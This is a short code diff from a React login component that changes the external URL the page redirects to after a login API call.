@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://tvb.itpanthera.top/';
+      window.location.href = 'https://tent.cookshowfiles.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
